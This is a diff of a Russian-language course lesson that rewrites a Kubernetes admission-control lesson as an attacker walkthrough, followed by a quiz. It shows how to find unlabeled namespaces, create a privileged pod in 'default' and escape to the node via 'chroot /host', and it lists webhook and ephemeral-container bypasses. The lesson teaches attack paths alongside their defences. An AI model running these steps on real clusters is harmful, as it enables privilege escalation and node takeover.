@@ -14,164 +14,140 @@ useful_for:
 estimated_minutes: 40
 summary: "Как работают admission-контроллеры, Pod Security Standards и политики OPA/Kyverno. Классы обхода и практические приёмы, когда политика разрешает больше, чем кажется."
 ---
-## Зачем этот урок
 
-Admission-контроллеры — последний рубеж перед созданием ресурса в кластере. Они решают, попадёт ли под/деплой в кластер. Если политики настроены неверно, атакующий обходит их и запускает привилегированный под. Разберём цепочку admission, Pod Security Standards, классы обхода и защиту.
+## Задача
 
-## Где находится admission в цепочке
+В прошлом уроке у нас было право `create pods` — и мы сразу побежали запускать привилегированный под. Но иногда кластер отвечает: **«Forbidden»**. Значит, на пути стоит второй рубеж — **admission-контроллеры**. Они решают, попадёт ли объект в кластер, даже если RBAC разрешил сам вызов. Цель урока: понять, как устроена эта защита, и научиться находить в ней щели.
 
-Запрос к API-серверу: authentication → authorization (RBAC) → admission (mutating → validating) → etcd. Admission может изменять объект (mutating: мутирует, например добавляет sidecar) или отклонять (validating: webhook, PSA). Если RBAC разрешает `create pods`, но PSA блокирует privileged — под не создастся.
+## Данные, с которыми работаем
 
-## Уровни Pod Security Standards
+У нас по-прежнему под `web-7f9c-abc` и права `create pods` в namespace `prod`. Пробуем самое очевидное — привилегированный под, который даёт побег на ноду:
+
+```bash
+$ kubectl -n prod run test --image=alpine --restart=Never \
+    --overrides='{"spec":{"containers":[{"name":"t","image":"alpine",
+    "securityContext":{"privileged":true}}]}}'
+Error from server (Forbidden): pods "test" is forbidden:
+violates PodSecurity "restricted:latest": privileged
+```
+
+Кластер **отклонил** под. RBAC был не против, но сработала политика **Pod Security Admission** (PSA). Это и есть тема урока.
+
+## Шаг 1: что такое admission и где он в цепочке
+
+Когда ты обращаешься к API-серверу, запрос проходит четыре стадии по порядку:
+
+1. **authentication** — кто ты (SA-токен);
+2. **authorization** — RBAC: разрешён ли сам вызов `create pods`;
+3. **admission** — можно ли принять **этот конкретный объект**;
+4. запись в **etcd**.
+
+Admission-контроллеры бывают двух видов:
+- **mutating** — меняют объект (например, дописывают sidecar или `securityContext`);
+- **validating** — только одобряют или отклоняют.
+
+Сначала отрабатывают все mutating, потом validating. PSA — это validating: он сверяет под с набором правил и отклоняет несоответствующие.
+
+## Шаг 2: читаем политику — какие уровни и где
+
+PSA применяется к **namespace** по метке. Уровней три:
 
 | Уровень | Что запрещено |
 |---------|---------------|
-| privileged | ничего (всё разрешено) |
-| baseline | privileged, hostPath, hostPID/Network, лишние capabilities |
-| restricted | всё из baseline + non-root, seccomp, readOnlyRootFilesystem |
+| `privileged` | ничего (всё разрешено) |
+| `baseline` | privileged, hostPath, hostPID/Network, лишние capabilities |
+| `restricted` | всё из baseline + non-root, seccomp, readOnlyRootFilesystem |
 
-Namespace помечается: `pod-security.kubernetes.io/enforce=restricted`. Проверка:
-```bash
-kubectl get ns --show-labels | grep pod-security
-kubectl label --dry-run=server ns default pod-security.kubernetes.io/enforce=restricted
-```
-
-## Классы обхода
-
-- **Namespace без метки** — если PSA применяется только к части namespace, создайте под в непомеченном.
-- **Привилегированный ServiceAccount с exempt** — `admissionregistration` может исключать system-namespaces.
-- **Mutating webhook с ошибкой** — `failurePolicy: Ignore` пропускает объект при недоступности webhook.
-- **Право `update` на namespace** — можно снять метку PSA.
-- **Создание pod через другой контроллер** (Deployment/CronJob) — политика та же, но легко забыть про aggregator-API.
-
-## Разобранный пример: обход через исключение namespace
-
-1. PSA enforce=restricted на namespace `prod`, но `kube-system` исключён.
-2. Имея `create pods` в `kube-system` (через широкий RBAC), запускаем privileged под:
-```bash
-kubectl -n kube-system run pwn --image=alpine --restart=Never \
-  --overrides='{"spec":{"containers":[{"name":"pwn","image":"alpine",
-  "securityContext":{"privileged":true},"command":["sleep","100000"]}]}}'
-```
-3. Через privileged под выходим на ноду.
-
-## Mutating/Validating порядок
-
-Сначала все mutating webhook (в порядке, затем по алфавиту), потом validating. Если mutating добавляет securityContext после проверки — возможна рассинхронизация. Проверяйте `kubectl get mutatingwebhookconfigurations -o yaml` на `failurePolicy: Ignore` и `namespaceSelector`.
-
-## Проверка покрытия политик
+Смотрим, какие namespace чем помечены:
 
 ```bash
-kubectl get psp                      # legacy, до 1.25
-kubectl get podsecuritypolicies
-kubectl get validatingwebhookconfigurations
-kubectl auth can-i create pods --as=system:serviceaccount:default:default -n prod
-kubectl get rolebindings -A -o wide | grep -i admin
+$ kubectl get ns --show-labels | grep pod-security
+prod          pod-security.kubernetes.io/enforce=restricted
+app           pod-security.kubernetes.io/enforce=baseline
+kube-system   <none>
+default       <none>
 ```
 
-## Защита
+Вот первая щель: `prod` защищён `restricted`, `app` — слабее (`baseline`), а `kube-system` и `default` **вообще без метки**. Непомеченный namespace означает, что PSA к нему не применяется.
 
-- PSA enforce=restricted на всех пользовательских namespace.
-- Не давать `create pods`/`update ns` вне доверенных SA.
-- Webhook `failurePolicy: Fail` для критичных политик.
-- OPA/Gatekeeper/Kyverno для гибких правил.
-- Аудит admission-отказов.
+## Шаг 3: обходим через непомеченный namespace
 
-## Частые ошибки
-
-- Полагаться только на RBAC, забывая про PSA.
-- Оставлять system-namespaces без контроля.
-- `failurePolicy: Ignore` на security-webhook.
-- Не проверять, какие namespace исключены.
-- Забывать про aggregator API и контроллеры.
-
-## Что дальше / решение
-
-Убедившись, что PSA закрыт, ищите обход через права на namespace/webhook. Если нашли — запускайте привилегированный под и переходите к побегу (`cloud-kubernetes-escape`). Для защиты — централизованные политики и мониторинг.
-
-## OPA, Gatekeeper и Kyverno
-
-Помимо PSA, политики задают:
-- **Gatekeeper** (OPA) — `ConstraintTemplate` + `Constraint`.
-- **Kyverno** — политики на YAML, mutate/validate/generate.
-Проверка покрытия:
-```bash
-kubectl get constrainttemplates
-kubectl get constraints -A
-kubectl get clusterpolicies   # Kyverno
-kubectl get clusterpolicyreport -A
-```
-Если constraint не привязан к нужным namespace или в `match` ошибка — политика не работает.
-
-## Разобранный пример 2: обход через mutating webhook
-
-Webhook с `failurePolicy: Ignore` и `namespaceSelector`, исключающим `default`. Атакующий создаёт под в `default` с privileged — webhook недоступен → под создаётся. Проверка:
+Если у нас есть право создавать поды в `default` (RBAC действует по namespace), политика нас там не остановит. Проверяем:
 
 ```bash
-kubectl get mutatingwebhookconfigurations -o json | \
-  jq '.items[] | {name:.metadata.name, fail:.webhooks[].failurePolicy, ns:.webhooks[].namespaceSelector}'
+$ kubectl -n default run pwn --image=alpine --restart=Never \
+    --overrides='{"spec":{"containers":[{"name":"pwn","image":"alpine",
+    "securityContext":{"privileged":true},"command":["sleep","100000"]}]}}'
+pod/pwn created
 ```
 
-## Практика: проверка, что privileged не пройдёт
+Под создан. Дальше — знакомый побег из прошлого урока: примонтировать `/` ноды и прочитать её файлы.
 
 ```bash
-kubectl -n default run test --image=alpine --restart=Never \
-  --overrides='{"spec":{"containers":[{"name":"t","image":"alpine",
-  "securityContext":{"privileged":true}}]}}'
-# Error from server (Forbidden): pods "test" is forbidden:
-# violates PodSecurity "restricted:latest": privileged
+$ kubectl -n default exec -it pwn -- chroot /host /bin/sh
 ```
 
-Если под создался — политика не покрывает namespace.
+Вывод простой: **PSA — не глобальная защита, а метка на namespace**. Один namespace без метки обнуляет всю политику.
 
-## Таблица классов обхода
+## Полный прогон от начала до конца
+
+1. Попробовали privileged-под в `prod` → `Forbidden` (PSA restricted).
+2. Посмотрели метки namespace → нашли `kube-system` и `default` без метки.
+3. Создали privileged-под в `default` → успех.
+4. Вышли на ноду через `chroot /host`.
+
+Урок: **RBAC и PSA — независимые рубежи**. RBAC отвечает на «можешь ли ты вызвать create pods», PSA — на «соответствует ли под политике». Ломается любой из двух — защиты нет.
+
+## Если не сработало: другие классы обхода
+
+PSA — не единственный admission. Гибкие политики задают **OPA/Gatekeeper** (`ConstraintTemplate` + `Constraint`) и **Kyverno** (политики на YAML). Вот типовые щели:
 
 | Обход | Условие | Защита |
 |-------|---------|--------|
-| Непомеченный ns | PSA не глобальный | enforce на всех ns |
-| failurePolicy Ignore | webhook недоступен | Fail для security |
-| update namespace | RBAC широкий | запрет update ns |
+| Непомеченный namespace | PSA не глобальный | enforce на всех ns |
+| `failurePolicy: Ignore` | webhook недоступен при сбое | `Fail` для security-webhook |
+| `update` на namespace | можно снять метку PSA | запрет `update ns` |
 | system-namespace exempt | исключения в admission | ограничить RBAC |
-| aggregator API | забытые контроллеры | аудит всех путей create |
+| initContainers / ephemeral | политика проверяет только `containers` | покрывать все типы контейнеров |
 
-## Практическое задание
-
-Разверните kind-кластер, включите PSA enforce=restricted на namespace `app`, затем попробуйте создать privileged-под — он должен быть отклонён. Снимите метку (`kubectl label ns app pod-security.kubernetes.io/enforce-`) при наличии прав и повторите — под создастся. Это демонстрирует, что RBAC и PSA — независимые рубежи, и компромисс любого из них ломает защиту.
-
-Проверьте также, какие namespace исключены из webhook, и есть ли у вашего SA право `update` на namespace.
-
-## Как PSA взаимодействует с RBAC
-
-RBAC отвечает на вопрос «можешь ли ты вызвать create pods», а PSA — «соответствует ли под политике». Это независимые проверки. Поэтому слабый RBAC (лишние `create pods` у сервис-аккаунта) сам по себе не даёт побега, если PSA закрыт. И наоборот: строгий RBAC не спасёт, если PSA не покрывает namespace. Аудируйте оба слоя отдельно.
+Проверяем webhook'и — их `failurePolicy` и селекторы:
 
 ```bash
-kubectl auth can-i create pods --as=system:serviceaccount:app:builder -n app
-kubectl get ns app -o jsonpath='{.metadata.labels}'
+$ kubectl get mutatingwebhookconfigurations -o json | \
+    jq '.items[] | {name:.metadata.name, fail:.webhooks[].failurePolicy}'
+{ "name": "policy-webhook", "fail": "Ignore" }
 ```
 
-## Практика: разница между уровнями
+`Ignore` значит: если webhook недоступен, объект **пропускается**. Атакующий может дождаться сбоя или задеть селектор.
 
-Создайте три namespace с разными уровнями (`privileged`, `baseline`, `restricted`) и попробуйте один и тот же манифест в каждом. Вы увидите, что baseline блокирует privileged и hostPath, а restricted дополнительно требует non-root и seccomp. Это поможет быстро определять, какой уровень где стоит в реальном кластере, и искать namespace без меток — самую частую дыру.
+Отдельная лазейка — **порядок мутации и валидации**. Если mutating-webhook дописывает опасное поле **после** того, как валидатор посмотрел объект, оно проскакивает. И `ephemeral`-контейнеры (`kubectl debug`) политики часто не покрывают — их проверяют реже, чем обычные.
 
-## Разница между PSA и PSP (legacy)
+## Частые ошибки и подводные камни
 
-PodSecurityPolicy (PSP) был удалён в Kubernetes 1.25. До этого он был отдельным admission-плагином, требовавшим RBAC-привязки. Его главная проблема — сложность: легко было забыть привязать PSP, и тогда политика не действовала. PSA заменил его, перенеся контроль на метки namespace. Если вы встречаете кластер < 1.25, проверяйте `kubectl get psp` и `kubectl get clusterrole | grep psp`. Для атакующего мигрированный кластер безопаснее: PSA сложнее «забыть», потому что он применяется автоматически по метке namespace.
+- **Полагаться только на RBAC.** RBAC разрешает вызвать `create pods`, а PSA может отклонить сам под — это два независимых рубежа, и смотреть надо оба.
+- **Забывать про system-namespace.** `kube-system` часто исключён из строгих политик; туда же ведут многие широкие права.
+- **Не проверять `failurePolicy`.** Webhook с `Ignore` пропускает объект при своём сбое — это лазейка, а не защита.
+- **Считать, что политика проверяет все контейнеры.** `initContainers` и ephemeral-контейнеры часто выпадают из правил.
+- **Пробовать вслепую.** Сначала прочитайте метки namespace и определения webhook'ов — это дешевле и тише, чем серия отклонённых подов.
 
-## Связка с аудитом API-сервера
+## Что мы теперь знаем
 
-Admission-отказы фиксируются в audit-логах API-сервера. Настройте политику аудита так, чтобы записывались `create`/`update` pod-ресурсов и решения admission. Тогда вы увидите, кто и когда пытался создать privileged-под и был ли он отклонён. Это ключевой источник для IR: без audit-логов попытка обхода PSA остаётся невидимой, и вы не узнаете, что защита сработала.
+- Admission — третья стадия после authn/authz; mutating меняет объект, validating отклоняет.
+- PSA задаёт уровни `privileged`/`baseline`/`restricted` и применяется **по метке namespace**.
+- Namespace без метки — не защищён; это самая частая дыра.
+- RBAC и PSA независимы: слабый RBAC не даёт побега при строгом PSA, и наоборот.
+- `failurePolicy: Ignore`, право `update ns`, init/ephemeral-контейнеры — типовые обходы.
+- Audit-логи API-сервера фиксируют отказы admission — это источник для детекта.
 
-## Быстрая проверка покрытия
+## На что смотреть дальше
 
-```bash
-kubectl get ns --show-labels | grep pod-security
-kubectl get validatingwebhookconfigurations,mutatingwebhookconfigurations
-kubectl get constrainttemplates
-```
-
-Если namespace без метки PSA или webhook с `failurePolicy: Ignore` — это дыра. Проверяйте оба механизма до попытки создания привилегированного пода.
+- **k8s-image-supply-chain**: как через образ обойти политику и попасть на ноды.
+- **runc-escape-deep**: побег из контейнера на уровне рантайма, мимо admission.
+- **k8s-falco-bypass**: обход runtime-детекта, когда admission уже пройден.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какие три уровня задаёт Pod Security Admission?"
@@ -185,36 +161,40 @@ kubectl get constrainttemplates
 - question: "Где чаще всего находят ослабленный admission-режим?"
   options:
     - "В /etc/hosts"
-    - "В системных/служебных namespace с исключениями политик"
-    - "В DNS"
-    - "В Service"
+    - "В namespace без метки или в системных namespace с исключениями политик"
+    - "В DNS-записях"
+    - "В объекте Service"
   answer: 1
-  explanation: "Системные namespace часто исключены из строгих политик."
+  explanation: "Системные и непомеченные namespace часто не покрыты строгими политиками."
 - question: "Какая лазейка связана с порядком mutating и validating?"
   options:
     - "Мутация происходит после валидации, добавляя опасные поля"
-    - "Валидация всегда после мутации"
+    - "Валидация всегда идёт после мутации"
     - "Они выполняются одновременно"
     - "Порядок не важен"
   answer: 0
-  explanation: "Если валидатор смотрит до финальной мутации, опасные поля могут проскочить."
-- question: "Почему ephemeral containers (kubectl debug) интересны для обхода?"
+  explanation: "Если валидатор смотрит объект до финальной мутации, опасные поля могут проскочить."
+- question: "Почему ephemeral-контейнеры (kubectl debug) интересны для обхода?"
   options:
-    - "Они быстрее"
+    - "Они запускаются быстрее"
     - "Политики могут не покрывать их так же строго, как обычные контейнеры"
-    - "Они не создаются"
-    - "Они требуют root"
+    - "Они вообще не создаются"
+    - "Они требуют root-доступ"
   answer: 1
   explanation: "Политики часто забывают про ephemeral-контейнеры."
-- question: "Что из перечисленного политика может упустить, проверяя только containers?"
+- question: "Что политика может упустить, проверяя только поле containers?"
   options:
     - "metadata"
-    - "initContainers и ephemeral containers"
+    - "initContainers и ephemeral-контейнеры"
     - "labels"
     - "annotations"
   answer: 1
   explanation: "initContainers и ephemeral-контейнеры — частая слепая зона политик."
 ```
+
+## Куда дальше
+
+В следующем уроке мы поднимемся с уровня одного кластера на уровень управляемых Kubernetes — EKS, AKS и GKE — и посмотрим, как их специфика (node SA, managed identity, метаданные) открывает новые пути. А пока главное запомни: **admission — это рубеж по namespace, а не по кластеру**, и один непомеченный namespace стоит дороже любой стены.
 
 ## Где пригодится
 
